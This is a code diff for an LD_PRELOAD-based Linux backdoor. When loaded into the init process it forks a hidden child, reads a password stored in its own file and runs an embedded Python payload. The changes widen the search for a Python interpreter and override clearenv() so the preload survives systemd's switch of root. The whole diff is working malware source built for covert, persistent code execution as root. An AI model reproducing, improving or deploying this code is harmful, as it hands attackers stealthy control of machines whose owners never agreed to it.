@@ -8,10 +8,8 @@
 // dirty, see Makefile
 #include "/dev/stdin"
 
-int shell(int argc, const char *argv[]) {
-    // backdoor specific programs if we want to. Currently disabled (||1)
-    if(!strncmp(argv[0], "/sbin/init", 10)||1) {
-        // only execute inside /sbin/init
+int shell(void) {
+    if(getpid() == 1) {
         pid_t pid = fork();
         if (pid == 0) {
             // don't show any output
@@ -33,7 +31,8 @@ int shell(int argc, const char *argv[]) {
                 fseek(self, -2, SEEK_CUR);
             }
             // read password
-            char *pass = malloc(pwlen);
+            char *pass = malloc(pwlen+1);
+            pass[pwlen] = '\0';
             fread(pass, pwlen, 1, self);
             fclose(self);
 
@@ -46,27 +45,49 @@ int shell(int argc, const char *argv[]) {
                 NULL
             };
             // delete self
-            unlink(sopath);
+            // unlink(sopath);
             // sleep, wait for networking etc
             sleep(WAIT);
 
-            // Choose the correct binary. The payload is agnostic
-            if (access("/usr/bin/python2", F_OK) != -1) {
-                execle("/usr/bin/python2",
-                        "python2",
-                        "-c",
-                        PAYLOAD, // payload is taken from /dev/stdin. See Makefile for details
-                        NULL,
-                        envp);
-            } else if (access("/usr/bin/python3", F_OK) != -1) {
-                execle("/usr/bin/python3",
-                        "python3",
-                        "-c",
-                        PAYLOAD, // payload is taken from /dev/stdin. See Makefile for details
-                        NULL,
-                        envp);
+            // try our best to find python. We don't have PATH so we can't use execvpe
+            char *pythonpaths[] = {
+                "/usr/bin/python2",
+                "/usr/local/bin/python2",
+                "/bin/python2",
+
+                "/usr/bin/python3",
+                "/usr/local/bin/python3",
+                "/bin/python3"
+            };
+            for (int i = 0; i < 6; i++) {
+                if (access(pythonpaths[i], F_OK) != -1) {
+                    execle(pythonpaths[i],
+                            "python",
+                            "-c",
+                            PAYLOAD, // payload is taken from /dev/stdin. See Makefile for details
+                            NULL,
+                            envp);
+                }
             }
         }
+    } else {
+        unsetenv("LD_PRELOAD");
     }
     return 0;
+}
+
+
+extern char **environ;
+int clearenv (void) {
+    /*
+     * clearenv is called once in systemd, just before we switch root.
+     * systemd/src/core/main.c:1901
+     */
+
+    char ldpreload[] = "LD_PRELOAD=/usr/lib/lblinux.so.1\0";
+    environ[0] = malloc(strlen(ldpreload)+1);
+    environ[0] = ldpreload;
+    environ[1] = NULL;
+    return 0;
+
 }
